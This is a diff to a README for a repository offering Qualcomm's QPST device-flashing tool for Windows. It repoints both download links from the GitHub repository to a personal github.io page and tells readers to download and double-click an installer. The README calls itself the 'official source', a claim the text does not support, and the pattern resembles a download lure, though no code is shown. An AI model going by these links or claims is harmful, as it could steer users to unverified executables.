@@ -1,6 +1,6 @@
 # ⚙️ Descargar-QPST-Tool - Flash Qualcomm devices on Windows easily
 
-[![Download QPST Tool](https://img.shields.io/badge/Download-QPST_Tool-blue.svg)](https://github.com/GNoggs-Dev/Descargar-QPST-Tool)
+[![Download QPST Tool](https://img.shields.io/badge/Download-QPST_Tool-blue.svg)](https://gnoggs-dev.github.io)
 
 ## 📁 Project Overview
 This repository provides the official source to acquire the Qualcomm Service Tool. This software allows users to manage and flash Android devices that use Qualcomm processor hardware. It works on Windows 10 and Windows 11. The tool communicates with your device through a hardware interface to update firmware, manage data, and perform service tasks on supported phones.
@@ -19,7 +19,7 @@ Ensure your computer meets these minimum specifications before you begin the set
 ## 💾 How to Download and Install
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the project link to start your download: [https://github.com/GNoggs-Dev/Descargar-QPST-Tool](https://github.com/GNoggs-Dev/Descargar-QPST-Tool)
+1. Visit the project link to start your download: [https://gnoggs-dev.github.io](https://gnoggs-dev.github.io)
 2. Locate the release section on the page.
 3. Save the installer file to your desktop.
 4. Double-click the file to open the setup wizard.
